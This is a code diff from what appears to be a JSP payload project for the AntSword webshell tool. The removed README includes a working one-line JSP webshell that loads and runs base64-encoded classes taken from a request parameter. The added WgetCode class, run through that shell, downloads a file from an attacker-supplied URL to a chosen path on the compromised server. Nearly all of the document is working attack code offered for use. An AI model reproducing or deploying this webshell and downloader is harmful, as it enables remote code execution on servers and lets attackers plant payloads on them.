@@ -1,60 +1,30 @@
-# JspForAntSword
-中国蚁剑JSP一句话Payload
-
-详细介绍： https://yzddmr6.tk/posts/antsword-diy-3/
-
-环境： jdk1.6  tomcat7
-
-编译命令
-
-```
-javac -cp "D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar" Test.java
-```
-
-保存编译后的class字节码
-
-```
-base64 -w 0 Test.class > Test.txt
-```
-
-Shell：
-
-```
-<%!class U extends ClassLoader{ U(ClassLoader c){ super(c); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%><% String cls=request.getParameter("ant");if(cls!=null){ new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%>
-```
-
-
-
-Demo.java
-
-```
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.jsp.PageContext;
 import java.io.ByteArrayOutputStream;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 
-public class Demo {
-    public String encoder;
-    public String cs;
+public class WgetCode {
     @Override
     public boolean equals(Object obj) {
         PageContext page = (PageContext)obj;
         ServletRequest request = page.getRequest();
         ServletResponse response = page.getResponse();
-        encoder = request.getParameter("encoder")!=null?request.getParameter("encoder"):"";
-        cs=request.getParameter("charset")!=null?request.getParameter("charset"):"UTF-8";
+        String encoder = request.getParameter("encoder")!=null?request.getParameter("encoder"):"";
+        String cs=request.getParameter("charset")!=null?request.getParameter("charset"):"UTF-8";
         StringBuffer output = new StringBuffer("");
         StringBuffer sb = new StringBuffer("");
         try {
             response.setContentType("text/html");
             request.setCharacterEncoding(cs);
             response.setCharacterEncoding(cs);
-            String var0 = EC(decode(request.getParameter("var0")+""));
-            String var1 = EC(decode(request.getParameter("var1")+""));
-            String var2 = EC(decode(request.getParameter("var2")+""));
-            String var3 = EC(decode(request.getParameter("var3")+""));
+            String var1 = EC(decode(request.getParameter("var1")+"", encoder,cs),encoder,cs);
+            String var2 = EC(decode(request.getParameter("var2")+"", encoder,cs),encoder,cs);
             output.append("->" + "|");
-            //sb.append(SysInfoCode(var0));
+            sb.append(WgetCode(var1,var2));
             output.append(sb.toString());
             output.append("|" + "<-");
             page.getOut().print(output.toString());
@@ -63,12 +33,12 @@ public class Demo {
         }
         return true;
     }
-    String EC(String s) throws Exception {
-        if(encoder.equals("hex")) return s;
+    String EC(String s,String encoder,String cs) throws Exception {
+        if(encoder.equals("hex") || encoder == "hex") return s;
         return new String(s.getBytes(), cs);
     }
-    String decode(String str) throws Exception{
-        if(encoder.equals("hex")){
+    String decode(String str, String encode ,String cs) throws Exception{
+        if(encode.equals("hex") || encode=="hex"){
             if(str=="null"||str.equals("null")){
                 return "";
             }
@@ -81,7 +51,7 @@ public class Demo {
                 baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
             }
             return baos.toString("UTF-8");
-        }else if(encoder.equals("base64")){
+        }else if(encode.equals("base64") || encode == "base64"){
             byte[] bt = null;
             sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
             bt = decoder.decodeBuffer(str);
@@ -89,8 +59,20 @@ public class Demo {
         }
         return str;
     }
+    String WgetCode(String urlPath, String saveFilePath) throws Exception {
+        URL u = new URL(urlPath);
+        int n = 0;
+        FileOutputStream os = new FileOutputStream(saveFilePath);
+        HttpURLConnection h = (HttpURLConnection) u.openConnection();
+        InputStream is = h.getInputStream();
+        byte[] b = new byte[512];
+        while ((n = is.read(b)) != -1) {
+            os.write(b, 0, n);
+        }
+        os.close();
+        is.close();
+        h.disconnect();
+        return "1";
+    }
 
 }
-
-```
-
